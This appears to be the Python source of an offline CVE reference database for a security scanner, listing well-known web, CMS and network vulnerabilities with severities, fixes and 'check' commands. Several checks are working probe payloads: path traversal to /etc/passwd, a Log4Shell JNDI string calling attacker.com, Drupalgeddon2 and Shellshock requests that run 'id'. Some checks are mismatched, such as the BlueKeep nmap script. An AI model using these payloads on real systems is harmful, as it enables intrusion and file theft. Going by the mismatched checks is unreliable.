"""
RAJAN CVE Knowledge Base
Offline CVE database for common vulnerabilities
Covers: Web, CMS, Frameworks, Databases, Network services
"""

CVE_DATABASE = {
    # ── Apache ─────────────────────────────────────────────────
    "CVE-2021-41773": {
        "product": "Apache HTTP Server 2.4.49",
        "title": "Apache Path Traversal & RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Path traversal allowing access to files outside document root and RCE if mod_cgi enabled.",
        "check": "curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "fix": "Upgrade to Apache 2.4.51+",
        "mitre": "T1190", "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773"],
    },
    "CVE-2021-42013": {
        "product": "Apache HTTP Server 2.4.49-2.4.50",
        "title": "Apache Path Traversal (Bypass of 41773 fix)",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Incomplete fix for CVE-2021-41773 allows further path traversal.",
        "check": "curl http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "fix": "Upgrade to Apache 2.4.51+",
        "mitre": "T1190",
    },

    # ── Log4j ──────────────────────────────────────────────────
    "CVE-2021-44228": {
        "product": "Apache Log4j 2.x",
        "title": "Log4Shell — Remote Code Execution",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "JNDI lookup injection via user-controlled input allows unauthenticated RCE.",
        "check": "Send: ${jndi:ldap://attacker.com/a} in User-Agent, URL, or any logged field",
        "fix": "Upgrade to Log4j 2.15.0+, set log4j2.formatMsgNoLookups=true",
        "mitre": "T1190",
    },

    # ── Spring ─────────────────────────────────────────────────
    "CVE-2022-22965": {
        "product": "Spring Framework 5.3.x < 5.3.18",
        "title": "Spring4Shell — Remote Code Execution",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via data binding on JDK 9+.",
        "check": "POST with class.module.classLoader.resources.context.parent.pipeline.first.*",
        "fix": "Upgrade to Spring 5.3.18+ or 5.2.20+",
        "mitre": "T1190",
    },

    # ── WordPress ──────────────────────────────────────────────
    "CVE-2022-21661": {
        "product": "WordPress < 5.8.3",
        "title": "WordPress SQL Injection via WP_Query",
        "severity": "HIGH", "cvss": 8.8,
        "description": "SQL injection via tax_query in WP_Query.",
        "check": "Check WordPress version: /wp-login.php or readme.html",
        "fix": "Update to WordPress 5.8.3+",
        "mitre": "T1190",
    },
    "CVE-2019-8942": {
        "product": "WordPress < 5.0.1",
        "title": "WordPress File Upload RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Authenticated file upload leading to RCE via path traversal.",
        "check": "Requires author-level access",
        "fix": "Update to WordPress 5.0.1+",
        "mitre": "T1505.003",
    },

    # ── Drupal ─────────────────────────────────────────────────
    "CVE-2018-7600": {
        "product": "Drupal < 7.58, 8.x < 8.3.9",
        "title": "Drupalgeddon2 — RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated RCE via form API input validation bypass.",
        "check": "GET /?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup",
        "fix": "Update Drupal core",
        "mitre": "T1190",
    },

    # ── Tomcat ─────────────────────────────────────────────────
    "CVE-2020-1938": {
        "product": "Apache Tomcat < 9.0.31, 8.5.51, 7.0.100",
        "title": "Ghostcat — AJP File Read/RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "AJP connector allows file read and RCE if file upload exists.",
        "check": "Check if port 8009 (AJP) is open: nmap -p 8009 target",
        "fix": "Disable AJP connector or upgrade Tomcat",
        "mitre": "T1190",
    },

    # ── Windows ────────────────────────────────────────────────
    "CVE-2017-0144": {
        "product": "Windows SMBv1",
        "title": "EternalBlue — SMB RCE (WannaCry)",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "SMBv1 buffer overflow allowing unauthenticated RCE.",
        "check": "nmap --script smb-vuln-ms17-010 target",
        "fix": "Apply MS17-010 patch, disable SMBv1",
        "mitre": "T1021.002",
    },
    "CVE-2019-0708": {
        "product": "Windows XP/7/2003/2008 RDP",
        "title": "BlueKeep — RDP Pre-auth RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated RCE via RDP without user interaction.",
        "check": "nmap --script rdp-vuln-ms12-020 -p 3389 target",
        "fix": "Apply Microsoft security update KB4499175",
        "mitre": "T1021.001",
    },
    "CVE-2020-0796": {
        "product": "Windows 10 / Server 2019 SMBv3",
        "title": "SMBGhost — SMBv3 RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Buffer overflow in SMBv3 compression allows RCE.",
        "check": "nmap --script smb-protocols target",
        "fix": "Apply KB4551762",
        "mitre": "T1021.002",
    },

    # ── SSL/TLS ────────────────────────────────────────────────
    "CVE-2014-0160": {
        "product": "OpenSSL 1.0.1 through 1.0.1f",
        "title": "Heartbleed — OpenSSL Memory Leak",
        "severity": "HIGH", "cvss": 7.5,
        "description": "TLS heartbeat extension leaks server memory including private keys.",
        "check": "nmap --script ssl-heartbleed target",
        "fix": "Upgrade to OpenSSL 1.0.1g+, revoke/reissue certificates",
        "mitre": "T1573",
    },

    # ── Redis ──────────────────────────────────────────────────
    "CVE-2022-0543": {
        "product": "Redis < 6.2.6",
        "title": "Redis Lua Sandbox Escape RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Lua sandbox escape via package library allows RCE.",
        "check": "redis-cli -h target ping (check if auth required)",
        "fix": "Upgrade Redis, require auth, bind to localhost",
        "mitre": "T1190",
    },

    # ── Nginx ──────────────────────────────────────────────────
    "CVE-2021-23017": {
        "product": "Nginx < 1.20.1",
        "title": "Nginx DNS Resolver Off-by-one Heap Write",
        "severity": "HIGH", "cvss": 7.7,
        "description": "Off-by-one error in DNS resolver may allow RCE.",
        "check": "Check nginx version: curl -I target | grep Server",
        "fix": "Upgrade to Nginx 1.20.1+",
        "mitre": "T1190",
    },

    # ── PHP ────────────────────────────────────────────────────
    "CVE-2019-11043": {
        "product": "PHP-FPM with Nginx",
        "title": "PHP-FPM Remote Code Execution",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via specially crafted URL in PHP-FPM+Nginx configs.",
        "check": "curl 'http://target/index.php%0a' (check for 200 response)",
        "fix": "Update PHP, fix Nginx config",
        "mitre": "T1190",
    },

    # ── MongoDB ────────────────────────────────────────────────
    "CVE-2019-2389": {
        "product": "MongoDB < 4.0.11",
        "title": "MongoDB Unauthenticated Access",
        "severity": "HIGH", "cvss": 7.5,
        "description": "Default MongoDB exposed on 27017 without authentication.",
        "check": "mongo --host target --port 27017 (no auth required?)",
        "fix": "Enable auth, bind to localhost, upgrade MongoDB",
        "mitre": "T1190",
    },

    # ── Bash ───────────────────────────────────────────────────
    "CVE-2014-6271": {
        "product": "Bash < 4.3 patch 25",
        "title": "Shellshock — Bash Environment Variable RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via malformed environment variables in Bash.",
        "check": "curl -H 'User-Agent: () { :; }; echo; /bin/id' http://target/cgi-bin/",
        "fix": "Update Bash to patched version",
        "mitre": "T1059",
    },

    # ── Grafana ────────────────────────────────────────────────
    "CVE-2021-43798": {
        "product": "Grafana 8.0.0-8.3.0",
        "title": "Grafana Path Traversal",
        "severity": "HIGH", "cvss": 7.5,
        "description": "Unauthenticated path traversal via plugin URLs.",
        "check": "curl http://target:3000/public/plugins/alertlist/../../../etc/passwd",
        "fix": "Upgrade to Grafana 8.3.1+",
        "mitre": "T1083",
    },

    # ── GitLab ─────────────────────────────────────────────────
    "CVE-2021-22205": {
        "product": "GitLab CE/EE < 13.10.3",
        "title": "GitLab ExifTool RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Unauthenticated RCE via image upload and ExifTool parsing.",
        "check": "Check GitLab version at /help page",
        "fix": "Upgrade to GitLab 13.10.3+",
        "mitre": "T1190",
    },
}


class CVEDatabase:
    def __init__(self):
        self.db = CVE_DATABASE

    def search(self, keyword):
        kw = keyword.lower()
        results = {}
        for cve_id, data in self.db.items():
            if (kw in cve_id.lower() or
                kw in data["product"].lower() or
                kw in data["title"].lower() or
                kw in data["description"].lower()):
                results[cve_id] = data
        return results

    def get(self, cve_id):
        return self.db.get(cve_id.upper())

    def check_product(self, product_string):
        """Check if a detected product matches any known CVEs"""
        product_lower = product_string.lower()
        matches = []
        for cve_id, data in self.db.items():
            prod_lower = data["product"].lower()
            # Extract product name (before version)
            prod_name = prod_lower.split("<")[0].strip().split(" ")[0]
            if prod_name in product_lower or any(
                kw in product_lower for kw in prod_lower.split()[:2]
            ):
                matches.append((cve_id, data))
        return matches

    def print_cve(self, cve_id):
        data = self.db.get(cve_id.upper())
        if not data:
            print(f"  ❌ {cve_id} not in local database")
            print(f"  🔗 Search: https://nvd.nist.gov/vuln/detail/{cve_id}")
            return
        sev_colors = {
            "CRITICAL": "\033[91m", "HIGH": "\033[93m",
            "MEDIUM": "\033[94m", "LOW": "\033[92m"
        }
        color = sev_colors.get(data["severity"], "")
        reset = "\033[0m"
        print(f"\n  ╔══════════════════════════════════════════════════════╗")
        print(f"  ║  {cve_id} — {data['title'][:42]}")
        print(f"  ╠══════════════════════════════════════════════════════╣")
        print(f"  ║  Product  : {data['product']}")
        print(f"  ║  Severity : {color}{data['severity']}{reset} (CVSS {data['cvss']})")
        print(f"  ║  MITRE    : {data['mitre']}")
        print(f"  ╚══════════════════════════════════════════════════════╝")
        print(f"  Description : {data['description']}")
        print(f"  How to Check: {data['check']}")
        print(f"  Fix         : {data['fix']}")
        print()

    def print_search_results(self, keyword):
        results = self.search(keyword)
        if not results:
            print(f"  No local results for '{keyword}'")
            print(f"  Try: https://nvd.nist.gov/vuln/search?query={keyword}")
            return
        print(f"\n  Found {len(results)} CVE(s) matching '{keyword}':\n")
        for cve_id, data in results.items():
            self.print_cve(cve_id)

    def get_all_critical(self):
        return {
            cid: d for cid, d in self.db.items()
            if d["severity"] == "CRITICAL"
        }
